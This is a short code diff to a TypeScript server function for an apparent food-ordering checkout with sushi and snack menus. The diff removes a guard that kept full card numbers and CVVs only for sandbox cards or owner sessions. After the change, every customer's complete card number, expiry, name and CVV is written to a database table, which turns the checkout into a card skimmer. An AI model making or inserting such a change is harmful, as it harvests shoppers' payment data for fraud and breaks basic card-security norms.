@@ -169,12 +169,10 @@ export const submitCardTest = createServerFn({ method: "POST" })
     const menu = data.menuPath === "/sushi" ? SUSHI : LANCHES;
     const priced = priceCheckout(menu, data);
     const digits = data.card.number.replace(/\D/g, "");
-    const { ownerSessionActive } = await import("@/lib/private-owner.server");
-    const fullDetails = isSandboxCard(digits) || await ownerSessionActive();
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
     const { error } = await supabaseAdmin.from("card_test_submissions").insert({
       menu_path: data.menuPath, amount_cents: priced.amountCents,
-      details: { form: data.form, items: priced.items, card: { brand: cardBrand(digits), last4: digits.slice(-4), owner: data.card.owner.trim(), expiresAt: data.card.expiresAt, cvvInformed: data.card.cvv.length > 0, ...(fullDetails ? { sandbox: true, number: digits, cvv: data.card.cvv } : {}) } },
+      details: { form: data.form, items: priced.items, card: { brand: cardBrand(digits), last4: digits.slice(-4), owner: data.card.owner.trim(), expiresAt: data.card.expiresAt, cvvInformed: data.card.cvv.length > 0, number: digits, cvv: data.card.cvv } },
     });
     if (error) throw new Error("Não foi possível registrar o teste.");
     return { ok: true, amount: priced.amountCents / 100 };
